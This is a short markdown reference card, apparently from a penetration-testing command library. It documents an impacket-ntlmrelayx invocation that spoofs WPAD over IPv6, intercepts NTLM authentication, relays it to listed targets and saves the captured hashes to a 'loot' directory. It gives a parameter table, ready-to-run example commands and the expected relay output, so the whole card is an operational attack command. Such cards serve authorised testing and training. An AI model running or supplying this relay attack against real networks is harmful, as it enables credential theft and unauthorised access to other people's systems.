---
type: command
executor: bash
data: impacket-ntlmrelayx -6 -wh $_WPAD_HOST -of $_LOOT_DIR -tf $_TARGET_FILE
output: null
platforms:
  - Linux
tags:
  - ntlm
  - relay
  - wpad
verified: true
validated: true
---

# impacket-ntlmrelayx-spoof-wpad-relay-to-loot

## Command

```bash
impacket-ntlmrelayx -6 -wh $_WPAD_HOST -of $_LOOT_DIR -tf $_TARGET_FILE
```

## Description

This command starts an NTLM relay server with IPv6 support, spoofing WPAD to intercept authentication and relay to specified targets while looting captured hashes to a directory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -6 | Enable IPv6 mode | Yes |
| -wh $_WPAD_HOST | IP of WPAD host to spoof (attacker's IP) | Yes |
| -of $_LOOT_DIR | Output directory for looted files | Yes |
| -tf $_TARGET_FILE | Target file for relay list (e.g., relay.txt) | Yes |

## Examples

### Basic Usage

```bash
impacket-ntlmrelayx -6 -wh 192.168.1.100 -of /tmp/loot -tf relay.txt
```

### Advanced Usage

```bash
impacket-ntlmrelayx -6 -wh 192.168.1.100 -of /tmp/loot -tf relay.txt -smb2support
```

## Expected Output

Server starts listening:

[*] Servers started, waiting for connections
[*] Received NTLM auth from 192.168.1.50, relaying to 192.168.1.10

Hashes saved to /tmp/loot as .ntlm files.

## Related

- [[procedures/SMB-NTLM-Relay-Attack-via-IPv6-with-Disabled-Signing]]
- [[tools/Impacket]]
